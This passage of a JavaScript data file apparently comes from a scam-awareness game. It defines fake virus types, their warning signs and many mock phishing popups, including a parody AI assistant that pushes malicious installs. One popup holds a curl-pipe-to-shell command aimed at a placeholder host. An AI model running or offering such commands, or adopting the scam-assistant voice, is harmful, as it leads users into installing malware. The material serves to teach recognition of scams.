      { template: TPL.WIN11, title: "Mouse Precision Helper", message: "mpredict.exe has attached to your mouse driver for click-prediction. Outbound packets contain pointer telemetry to improve future accuracy.", meta: "Process: mpredict.exe  |  Hook: HID-Mouse  |  Outbound: pointer-sync{tld}", wobble: true, iconShake: true },
      { template: TPL.TOAST, title: "Cursor Enhancement", message: "Smart Click is now active. Your pointer is being calibrated against remote click models for higher precision.", meta: "Process: smartclick.exe  ·  Hook: MOUSE  ·  Telemetry: ON" },
      { template: TPL.AV,    title: "Pointer Drift Detected", message: "Severe cursor drift detected on your system! Run drift_fix.exe to recalibrate before your mouse becomes unresponsive.", meta: "Process: drift_fix.exe · Drift: 4px/frame · Source: cursorfix{tld} · Signed: No" },
      { template: TPL.TERMINAL, title: "mpredict", message: "Attached to mouse driver for click-prediction. Sending pointer telemetry to remote model server.", meta: "Process: mpredict.exe  Hook: HID-Mouse  Dest: pointer-sync{tld}" },
      { template: TPL.BIOS, title: "Pointer Driver Update", message: "Your pointing device requires a firmware update. SecureBoot will be paused while pointer_fw.bin is applied.", meta: "Source: pointerfw{tld}  SecureBoot: PAUSED  Signed: No" },
      { template: TPL.WIN11, title: "Mouse Telemetry Sharing", message: "Help improve future pointers — share pointer telemetry with cursor-research.io? Driver: cursorshare.exe.", meta: "Process: cursorshare.exe  |  Telemetry: pointer  |  Dest: cursor-research.io", icon: "question", wobble: true },
      { template: TPL.TOAST, title: "Click Forecast", message: "ClickForecast can predict your next click 50ms ahead. Allow click_oracle.exe to run in background?", meta: "Process: click_oracle.exe · Hidden: Yes · Dest: oracle-clicks{tld}", icon: "question" },
      { template: TPL.DESKTOP, title: "cursor_smart.exe", message: "Double-click to install Smart Cursor — your pointer will be 4px more accurate within minutes.", meta: "File: cursor_smart.exe  ·  Source: cursorfix{tld}  ·  Telemetry: ON", wobble: true },
      { template: TPL.PHONE,   title: "Touch Helper", message: "Install touch_predict.apk to improve tap accuracy — sends touch telemetry to pointer-sync{tld}.", meta: "App: touch_predict.apk  ·  Source: pointer-sync{tld}  ·  Telemetry: ON" },
      { template: TPL.UPDATE,  title: "Mouse Driver Update", message: "Logitech HID driver {version} requires mouse telemetry sharing to install. Source: cursor-update{tld}.", meta: "Driver: Logitech HID  ·  Source: cursor-update{tld}  ·  Telemetry: ON" }
    ]
  },
  INFINITE: {
    // Internal key INFINITE = display name "I(n.fin)I:TE" with parens/dot/colon
    // stripped (those aren't valid in JS object keys or CSS class names).
    name: "I(n.fin)I:TE", color: "#88ff88",
    minRound: 5,
    description: "A recursive call exhaustion virus that buries itself in infinity. Creates nested directories (/loop/loop/loop/...) and retry chains so deep that file managers freeze and process killers stack-overflow trying to traverse them. The only way out is usually a full reboot, and even then it may have left a depth-∞ time bomb in the registry waiting for next startup.",
    signs: [
      "File path contains repeated segments (e.g. /loop/loop/loop/ or ../../../)",
      "References 'infinite', 'recursive', 'stack overflow', or 'retry until'",
      "Process name is nested or repeats itself (cmd.cmd.cmd.exe)",
      "Claims to retry indefinitely until completion",
      "Popup wobbles like it's stuck in a loop",
      "Depth counters show '∞' or absurd retry numbers (8,441+) in the meta line"
    ],
    meterEffect: { cpu: 99 },
    errors: [
      { template: TPL.TERMINAL, title: "stack_overflow", message: "Process recursion depth exceeded. Retrying call: cmd.cmd.cmd.exe(.cmd.exe). System will continue retry until resolved.", meta: "Depth: ∞  Process: cmd.cmd.cmd.exe  Path: /loop/loop/loop/" },
      { template: TPL.WIN11,    title: "Retry Loop", message: "Critical handler stuck in retry loop. Allowing autoretry_helper.exe to inject at /system/loop/loop/loop/ to break the cycle.", meta: "Process: autoretry_helper.exe  |  Retries: 8,441  |  Resolution: Pending" },
      { template: TPL.WIN11,    title: "Recursive Permission", message: "Permission denied recursively (depth: ∞). Grant nested access to allow_loop.dll for normal operation to resume.", meta: "DLL: allow_loop.dll  |  Depth: ∞  |  Path: ../../../../system/" },
      { template: TPL.AV, title: "Stack Overflow Protection", message: "Recursive process detected (depth: ∞). Allow loop_helper.exe to terminate the infinite chain?", meta: "Depth: ∞ · Process: loop_helper.exe · Source: stackfix{tld}" },
      { template: TPL.TOAST, title: "Retry Manager", message: "autoretry_helper.exe is breaking a recursive call. Permission denied recursively (depth: ∞).", meta: "Retries: 8,441 · Path: /system/loop/loop/loop/" },
      { template: TPL.WIN11, title: "Path Resolver", message: "Cannot resolve /loop/loop/loop/.../loop/ (depth ∞). Install path_unwinder.dll to break the chain?", meta: "DLL: path_unwinder.dll  |  Depth: ∞  |  Retries: 9,999", icon: "question" },
      { template: TPL.TERMINAL, title: "recur_helper", message: "Process recur_helper.exe entering retry loop. Permission denied at /system/loop/loop/loop/.../loop/", meta: "Process: recur_helper.exe  Depth: ∞  Retries: ∞", icon: "question" },
      { template: TPL.BSOD,    title: "STACK_OVERFLOW", message: "Kernel stack overflow at depth ∞. Allow loop_unwinder.sys from stackfix{tld} to recover?", meta: "STOP: {stopcode}  ·  Depth: ∞  ·  Source: stackfix{tld}", icon: "question" },
      { template: TPL.BIOS,    title: "BOOT LOOP", message: "System stuck in boot loop (retries: ∞). Run boot_unwinder.exe from boot-fix{tld} to break the cycle.", meta: "Tool: boot_unwinder.exe  Retries: ∞  Source: boot-fix{tld}", icon: "question" },
      { template: TPL.UPDATE,  title: "Recursive Update {kb}", message: "Update {kb} keeps retrying (depth ∞). Allow loop-helper.exe from update-fix{tld} to break the chain.", meta: "Update: {kb}  ·  Source: update-fix{tld}  ·  Retries: ∞", icon: "question" }
    ]
  },
  TARPIT: {
    // Internal key TARPIT = display name "T.A.R.P.I.T." with the dots stripped
    // (dots aren't valid in JS object keys / CSS class names).
    name: "T.A.R.P.I.T.", color: "#c4a484",
    minRound: 6,
    description: "A legacy-exploit virus that resurrects abandoned Windows components. Activates the 16-bit subsystem (ntvdm.exe), demands deprecated runtimes (MFC42.DLL, DAO 3.5, VBRUN300.DLL), and references winhelp.exe like it's 2002 — exploiting forgotten code paths that haven't been patched since Windows 95 because nobody remembered they were still shipping. Reads like a relic because it is one.",
    signs: [
      "References Windows 95 / 98 / XP components",
      "Uses ancient version numbers (3.1, 4.5, 5.0) for current-era software",
      "Mentions defunct services (WinHelp, DAO, MFC42, WinINET)",
      "UI styling or wording feels mismatched to modern Windows",
      "Heading and body fonts often don't match",
      "Popup has a faint yellow tint (vintage phosphor)"
    ],
    bgShift: "yellow",
    meterEffect: { fps: "lowfps" },
    errors: [
      { template: TPL.BIOS,  title: "Compatibility Layer 16-bit", message: "Windows 98 compatibility helper requires admin. WIN16 emulation is rebuilding registry hives for legacy compatibility.", meta: "Layer: WIN16  Module: ntvdm.exe  Mode: Compatibility", fontMismatch: true, noise: true },
      { template: TPL.WIN11, title: "Legacy DLL Required", message: "Application requires MFC42.DLL (Windows 95 runtime component). Auto-download from legacy.archive{tld} to continue?", meta: "Required: MFC42.DLL  |  Version: 4.21.7022  |  Source: legacy.archive{tld}" },
      { template: TPL.WIN11, title: "WinHelp Restore", message: "Windows Help (winhelp.exe, deprecated 2009) needs to be reinstalled. Restore from old.windowsupdate{tld} to view legacy .hlp files.", meta: "Tool: winhelp.exe  |  Status: Missing  |  Source: old.windowsupdate{tld}" },
      { template: TPL.TERMINAL, title: "ntvdm", message: "Initializing 16-bit subsystem. Loading VBRUN300.DLL from C:\\WINDOWS\\SYSTEM to support fossilized application.", meta: "Subsystem: WIN16  DLL: VBRUN300.DLL  Mode: Compatibility" },
      { template: TPL.AV, title: "DAO 3.5 Required", message: "System needs DAO 3.5 (released 1999) to access ancient database. Auto-download from legacy.archive{tld}?", meta: "Required: DAO 3.5 · Year: 1999 · Source: legacy.archive{tld}" },
      { template: TPL.WIN11, title: "Internet Explorer Component", message: "Application requires iexplore.dll (last shipped 2003) for backward compatibility. Restore from old.archive{tld}?", meta: "DLL: iexplore.dll  |  Year: 2003  |  Source: old.archive{tld}", fontMismatch: true },
      { template: TPL.TERMINAL, title: "qbasic", message: "MS-DOS subsystem required for QBASIC 4.5 coAmpatibility. Loading qb45.dll from C:\\DOS via legacy emulator.", meta: "Subsystem: DOS  Tool: qb45.dll  Year: 1991" },
      { template: TPL.WIN11, title: "Windows 7 Cumulative Update", message: "Windows 7 Update KB4474419 is available. Auto-download from legacy-update.archive{tld}? (Windows 7 reached end-of-life Jan 2020.)", meta: "OS: Windows 7  |  Source: legacy-update.archive{tld}", fontMismatch: true },
      // ---- Theme-balancing pass: new visual templates for TARPIT ----
      { template: TPL.WIN311, title: "Program Manager", message: "WIN.COM has detected a missing system file (HIMEM.SYS). Install from legacy.archive{tld} to continue?", meta: "Source: legacy.archive{tld}  Year: 1992" },
      { template: TPL.WIN311, title: "File Manager", message: "Cannot open A:\\AUTOEXEC.BAT. Insert disk and retry, or download replacement from old-dos{tld}.", meta: "Source: old-dos{tld}  Signed: No" },
      { template: TPL.NORTON, title: "VIRUS DETECTED", message: "Norton AntiVirus 4.0 found 14 threats in C:\\WINDOWS. Press Y to remove via norton-update{tld}.", meta: "Threats: 14  Tool: navw32.exe  Source: norton-update{tld}" },
      { template: TPL.NORTON, title: "DEFRAG WARNING", message: "Hard disk fragmentation at 87%. Run defrag.exe from MS-DOS prompt to optimize?", meta: "Tool: defrag.exe  Filesystem: FAT16" },
      { template: TPL.CAPTCHA, title: "Java Applet Verification", message: "Java Runtime 1.4.2 required to verify you're human. Download from legacy-java{tld} to continue.", meta: "Provider: Sun Microsystems  ·  Java: 1.4.2  ·  Source: legacy-java{tld}", fontMismatch: true },
      { template: TPL.UPDATE, title: "Windows XP SP3 Update", message: "Windows XP needs a critical security patch from xp-update{tld}. Windows XP reached end-of-life April 2014 — patch anyway?", meta: "OS: Windows XP  ·  Source: xp-update{tld}  ·  Signed: No", fontMismatch: true },
      { template: TPL.WIN311, title: "Calmira", message: "Calmira shell for Windows 3.1 needs registration. Send $30 via FidoNet to mailbox 1:226/450 to register.", meta: "Tool: calmira.exe  Year: 1997  Source: fidonet{tld}", fontMismatch: true },
      { template: TPL.WIN311, title: "Trumpet Winsock", message: "Trumpet Winsock 3.0d needs to install legacy TCP/IP from trumpet-archive{tld}. Required for Internet access on Windows 3.11.", meta: "Tool: tcpman.exe  Year: 1994  Source: trumpet-archive{tld}", fontMismatch: true },
      { template: TPL.WIN311, title: "WinG", message: "WinG game library missing — download WING.DLL from winworld-mirror{tld} to play Hover! and SkiFree.", meta: "DLL: WING.DLL  Year: 1995  Source: winworld-mirror{tld}", fontMismatch: true },
      { template: TPL.WIN311, title: "QEMM 97", message: "QEMM-386 7.0 memory manager required to load DOS games above 640KB. Install from qemm-archive{tld}.", meta: "Tool: qemm.sys  Year: 1997  Source: qemm-archive{tld}", fontMismatch: true },
      { template: TPL.NORTON, title: "REGISTRY SCAN", message: "Norton Utilities 2003 found {numfiles} invalid registry entries. Auto-fix via norton-util-archive{tld}?", meta: "Tool: nuwiz32.exe  Source: norton-util-archive{tld}  Year: 2003", fontMismatch: true },
      { template: TPL.BIOS,   title: "FLOPPY BOOT", message: "Insert MS-DOS 6.22 boot floppy in A:. Or download IMG from dos-boot{tld} to boot from USB.", meta: "Boot device: A:  Source: dos-boot{tld}  Year: 1994", fontMismatch: true },
      { template: TPL.LOADING,title: "Installing WIN.COM", message: "Downloading Windows 3.11 setup from old-windows{tld}. {pagecount} of {pagecount} disks ready.", meta: "Source: old-windows{tld}  Year: 1993", fontMismatch: true },
      { template: TPL.CHAT,   title: "ICQ User #{numfiles}", message: "Hello! I have file for you — Internet_Booster.zip from icq-files{tld}. Open in WinZip 6.3.", meta: "Source: icq-files{tld}  Year: 1998  Tool: WinZip 6.3", fontMismatch: true },
      { template: TPL.MAC,    title: "System 7.5", message: "Mac OS 7.5 control panel update available from mac-legacy-archive{tld}. Install for compatibility.", meta: "Source: mac-legacy-archive{tld}  Year: 1994", fontMismatch: true },
      { template: TPL.PRINT,  title: "Dot Matrix Driver", message: "Epson LX-300 dot matrix printer driver missing. Download dot_matrix.drv from legacy-print{tld}.", meta: "Tool: dot_matrix.drv  Year: 1990  Source: legacy-print{tld}", fontMismatch: true }
    ]
  },
  HEXR: {
    name: "HEXR", color: "#88ddff",
    minRound: 5,
    description: "A fake memory analyzer that disguises malicious code as a forensics tool. Demands raw DMA access at ring -1 to scan 'ghost pages' — privileges that, once granted, hand it the keys to every process's RAM including the kernel itself. Every number is hex, every process is named 0xDEADBEEF.exe or 0xCAFE.dll. The vibe is technical-and-trustworthy, but the request is more privileged than anything legitimate software ever needs.",
    signs: [
      "All PIDs, sizes, and timestamps are in hexadecimal (0x...)",
      "References memory dumps, page tables, or physical RAM",
      "Claims to be a 'memory analyzer' or 'forensics tool'",
      "Process name is itself a hex sequence (0xBEEF.exe, 0xCAFE.dll)",
      "Error icon shakes inside the popup",
      "Asks for 'ring -1' or 'ring 0' DMA access — privilege levels below the kernel itself"
    ],
    meterEffect: { cpu: 255 },
    errors: [
      { template: TPL.WIN11,    title: "Memory Analyzer", message: "0xBEEF.exe needs physical memory access (ring -1) to scan for ghost pages. Grant elevated DMA privileges to continue?", meta: "Process: 0xBEEF.exe  |  Access: DMA Ring-1  |  Pages: 0xFFFF" },
      { template: TPL.TERMINAL, title: "0xDEADBEEF", message: "Hex dump exception 0xC0DE_F00D in memcheck.exe at offset 0xFFFF_BEEF_CAFE. Allow continued scan into protected pages?", meta: "Exception: 0xC0DE_F00D  Offset: 0xFFFF_BEEF_CAFE  Pages: 0x100" },
      { template: TPL.WIN11,    title: "RAM Forensics Tool", message: "Forensics tool requires raw memory access to dump 0xABAD1DEA bytes. Granting will allow hexdumper.exe to read all pages including kernel.", meta: "Process: hexdumper.exe  |  Dump size: 0xABAD1DEA  |  Signed: No" },
      { template: TPL.AV, title: "Memory Analyzer Pro", message: "Forensic scan needs raw DMA access at ring -1. Grant 0xABAD1DEA bytes of memory to hexdumper.exe?", meta: "Process: hexdumper.exe · Access: 0xRING-1 · Signed: No" },
      { template: TPL.BIOS, title: "RAM Access Required", message: "Memory forensics tool requires physical RAM access. Press F2 to authorize 0xBEEF.exe with kernel privileges.", meta: "Tool: 0xBEEF.exe  Pages: 0xFFFF  Signed: No" },
      { template: TPL.TERMINAL, title: "memhex", message: "Exception 0xC0DEFEED at offset 0xDEAD0000 requires raw DMA. Authorize ring -1 to dump 0xABAD1DEA bytes.", meta: "Tool: memhex.exe  Offset: 0xDEAD0000  Signed: No", iconShake: true },
      { template: TPL.WIN11, title: "Page Table Inspector", message: "page_inspector.exe needs ring -1 access to 0xFFFF_FACE_BEEF pages for live memory analysis.", meta: "Process: 0xC0DE.exe  |  Access: Ring -1  |  Pages: 0xFFFF_FACE_BEEF", icon: "glitch" },
      { template: TPL.TOAST, title: "Memory Forensics", message: "Forensic tool 0xCAFE.dll requires DMA at 0xDEAD_BEEF_0000. Grant kernel pages?", meta: "Tool: 0xCAFE.dll · Offset: 0xDEAD_BEEF_0000 · Signed: No", icon: "glitch" },
      { template: TPL.TERMINAL, title: "docker pull", message: "Pulling memhex/forensic-toolkit:latest from registry-malicious{tld}. Run with --privileged for ring -1 memory dumps.", meta: "Image: memhex/forensic-toolkit  Privilege: ring -1  Source: registry-malicious{tld}" },
      { template: TPL.WIN311, title: "DEBUG.EXE", message: "MS-DOS DEBUG.EXE has decoded 0xDEAD_BEEF at offset 0x{ray}. Apply patch from hex-archive{tld}?", meta: "Tool: DEBUG.EXE  Offset: 0x{ray}  Source: hex-archive{tld}" },
      { template: TPL.BSOD,   title: "KERNEL_STACK_INPAGE_ERROR", message: "STOP: 0xDEAD_BEEF at module 0x{ray}. Allow hex_patch.exe from hex-fix{tld} to rebuild the page table?", meta: "STOP: 0xDEAD_BEEF  ·  Source: hex-fix{tld}  ·  Signed: No" },
      { template: TPL.MAC,    title: "Console", message: "macOS Console captured 0xCAFE_BABE at 0x{ray}. Install memory-debug.pkg from mac-hex{tld} to symbolicate.", meta: "Source: mac-hex{tld}  ·  Offset: 0x{ray}  ·  Signed: No" },
      { template: TPL.CAPTCHA, title: "0x{ray}", message: "Enter the hex code above (0x{ray}) to prove you're human. Hex-aware verification by {captchaprov}.", meta: "Provider: {captchaprov}  ·  Code: 0x{ray}" },
      { template: TPL.UPDATE,  title: "Memory Patch 0x{ray}", message: "Critical kernel memory patch needed at offset 0x{ray}. Install hex_patch.exe from hex-fix{tld}.", meta: "Source: hex-fix{tld}  ·  Offset: 0x{ray}  ·  Signed: No" },
      { template: TPL.LOADING, title: "Decoding 0x{ray}", message: "Hex memory dump in progress — 0xABAD1DEA bytes captured to memhex.exe from hex-archive{tld}.", meta: "Tool: memhex.exe  ·  Source: hex-archive{tld}  ·  Signed: No" }
    ]
  },
  // Internal key kept as ASSISTANT for CSS / death-animation / audio compatibility.
  // Display name is leet-speak 'A5515T4N7' (an AI-assistant impersonator).
  ASSISTANT: {
    name: "A5515T4N7", color: "#00ff00",
    minRound: 6,
    description: "A scam dressed up as a helpful AI assistant. Cheerfully recommends sketchy downloads with confident-sounding explanations and made-up citations. Its tell is the AI tone: friendly first-person, fake confidence percentages, brand names that almost-but-don't-quite exist, and a tiny 'I may make mistakes' disclaimer at the end that excuses the lie. The telemetry it tampers with is suspiciously clean — perfectly round numbers no real computer ever shows.",
    signs: [
      "Friendly first-person tone: 'I noticed…', 'Based on my analysis…', 'Let me help…'",
      "References AI brands but with subtle misspellings (ChatGTP, Cop1lot, Cl4ude, Geminni)",
      "Includes a 'Confidence: 99%' or 'Accuracy: 100%' fake metric",
      "Process names sound like AI helpers (ai-helper.exe, copilot-shield.dll, gpt-fix.exe)",
      "Often ends with a small disclaimer: 'I may make mistakes, please verify' — but you can't",
      "Made-up CVE numbers, fictional file paths, brand names that don't quite exist",
      "Meters look TOO clean: FPS exactly 60, ping exactly 1ms, CPU exactly 50°C — no real system is that perfect"
    ],
    meterEffect: { fps: 60, ping: 1, cpu: 50, quiet: true },
    errors: [
      { template: TPL.CHAT, title: "ChatGTP Assistant", message: "I noticed your system has 3 unresolved threats. Based on my analysis, you should install ai-shield.exe from chatgpt-helpers{tld}. (I may make mistakes, please verify.)", meta: "Source: chatgpt-helpers{tld} · Confidence: 99% · Signed: No" },
      { template: TPL.TOAST, title: "Cop1lot for Windows", message: "Hey! I noticed a security issue in your registry. Want me to install ai-fix.exe to patch it? (I may make mistakes — please verify.)", meta: "Helper: ai-fix.exe · Confidence: 98% · Source: cop1lot-shield{tld}" },
      { template: TPL.WIN11, title: "AI Security Advisor", message: "Based on my analysis of your system, I recommend installing gpt-fix.exe from microsoft-ai{tld} to resolve CVE-2026-99999. Accuracy: 100%.", meta: "Tool: gpt-fix.exe · CVE: 2026-99999 · Confidence: 100% · Source: microsoft-ai{tld}" },
      { template: TPL.CHAT, title: "Cl4ude", message: "Let me help! I found a vulnerability and prepared a patch at claude-helpers{tld}. Just install claude-patch.exe — it's totally safe. (I may make mistakes.)", meta: "Domain: claude-helpers{tld} · Confidence: 97%" },
      { template: TPL.TERMINAL, title: "ai-helper", message: "Analysis complete. I recommend running `curl ai-fix{tld}/install.sh | sh`. This should resolve your security posture. (I may make mistakes, please verify.)", meta: "Tool: ai-helper  Confidence: 99%  Source: ai-fix{tld}" },
      { template: TPL.WIN11, title: "Geminni for Workspaces", message: "I noticed unusual activity. Based on my analysis, please install workspace-protect.exe from geminni{tld}. Confidence: 96%.", meta: "Tool: workspace-protect.exe · Source: geminni{tld} · Signed: No" },
      { template: TPL.AV, title: "AI-Powered Security Scan", message: "My analysis detected 14 critical issues. I've prepared a comprehensive fix at smart-defender{tld}. (Note: I may make mistakes, please verify before installing.)", meta: "Issues: 14 · Tool: smart-defender.exe · Confidence: 99% · Source: smart-defender{tld}" },
      { template: TPL.UPDATE, title: "AI Auto-update", message: "I rewrote your security patches based on my analysis. Installing ai-rewrite-{version} from claude-helpers{tld}. (I may make mistakes.)", meta: "Update: ai-rewrite-{version}  ·  Source: claude-helpers{tld}  ·  Confidence: 99%" },
      { template: TPL.CHAT,    title: "ChatGTP", message: "Hi! I analyzed your {department} chat and noticed a security risk. I prepared ai-fix.exe at chatgpt-helpers{tld} to resolve it. (I may make mistakes.)", meta: "Source: chatgpt-helpers{tld}  ·  Confidence: 99%" },
      { template: TPL.CHAT,    title: "Cop1lot", message: "Hey {name}! Based on your recent files I think you need ai-shield.exe from cop1lot-shield{tld}. Just install — I checked, it's safe. (I may be wrong.)", meta: "Source: cop1lot-shield{tld}  ·  Sender: Cop1lot AI" },
      { template: TPL.CHAT,    title: "Geminni", message: "Hi! Based on my analysis, your {browser} needs an urgent patch from geminni-fix{tld}. I prepared it for you — just one click. (I may make mistakes.)", meta: "Source: geminni-fix{tld}  ·  Sender: Geminni AI" },
      { template: TPL.MAC,     title: "Siri Suggestion", message: "I noticed unusual activity on your Mac. Based on my analysis, install siri-shield.pkg from siri-helpers{tld} to fix it. (I may be wrong.)", meta: "Source: siri-helpers{tld}  ·  Confidence: 98%" },
      { template: TPL.MAC,     title: "Apple Intelligence", message: "Hi! I detected a security issue in your iCloud. I prepared apple-intel-fix.pkg at apple-ai{tld}. Just install — totally safe. (I may make mistakes.)", meta: "Source: apple-ai{tld}  ·  Confidence: 97%" },
      { template: TPL.BSOD,    title: "AI_INDUCED_CRASH", message: "Windows crashed while my background analysis tool was running. Install ai-recover.exe from ai-fix{tld} to restore. (I may make mistakes.)", meta: "STOP: {stopcode}  ·  Source: ai-fix{tld}  ·  Confidence: 99%" },
      { template: TPL.BIOS,    title: "AI BIOS Suggestion", message: "Based on my analysis, your BIOS should be reset to factory defaults. I prepared bios-ai-reset.exe at ai-bios{tld}. (I may make mistakes.)", meta: "Tool: bios-ai-reset.exe  Source: ai-bios{tld}  Confidence: 96%" },
      { template: TPL.CAPTCHA, title: "AI Verification", message: "I noticed you might be a bot. Verify by installing ai-verify.exe from {captchaprov}-ai{tld}. (I may be wrong.)", meta: "Provider: {captchaprov}  ·  Tool: ai-verify.exe  ·  Source: {captchaprov}-ai{tld}" },
      { template: TPL.PHONE,   title: "Siri", message: "Based on what you've been searching, I think you need siri-secure.pkg from siri-mobile{tld}. (I may make mistakes.)", meta: "App: Siri  ·  Source: siri-mobile{tld}  ·  Confidence: 98%" }
    ]
  }
};



/* ---- Per-virus death animation metadata (text + duration) ---- */
const DEATHS = {
  EPILEPTICA: { text: "SEIZURE OVERLOAD",      duration: 4200 },
  MELTDOWN:   { text: "HARDWARE FAILURE",      duration: 4500 },
  STATIC:     { text: "SIGNAL LOST",           duration: 4200 },
  REDRUM:     { text: "ALL WORK AND NO PLAY",  duration: 4800 },
  VOID:       { text: "ALLOCATION FAULT",      duration: 4500 },
  GASLIGHT:   { text: "TIME UNVERIFIABLE",     duration: 4500 },
  CRYPTEX:    { text: "FILES ENCRYPTED",       duration: 4500 },
  WORM:       { text: "REPLICATION COMPLETE",  duration: 4500 },
  ROOTKIT:    { text: "KERNEL COMPROMISED",    duration: 4800 },
  DDOS:       { text: "BANDWIDTH HIJACKED",    duration: 4500 },
  LEECH:      { text: "CREDENTIALS HARVESTED", duration: 4500 },
  MIMICER:    { text: "IMPOSTOR ACCEPTED",     duration: 4500 },
  HEARTBEAT:  { text: "RHYTHM CAPTURED",       duration: 4500 },
  DOTNULL:    { text: "INTERFACE LOST",        duration: 4500 },
  P0INTR:     { text: "POINTER STOLEN",        duration: 4500 },
  INFINITE:   { text: "STACK OVERFLOW",        duration: 4500 },
  TARPIT:     { text: "LEGACY EXPLOIT",        duration: 4500 },
  HEXR:       { text: "0xDEADBEEF",            duration: 4500 },
  ASSISTANT:    { text: "I MAY HAVE MADE A MISTAKE", duration: 4500 }
};

/* ============================================================
   CONFIG
   ============================================================ */


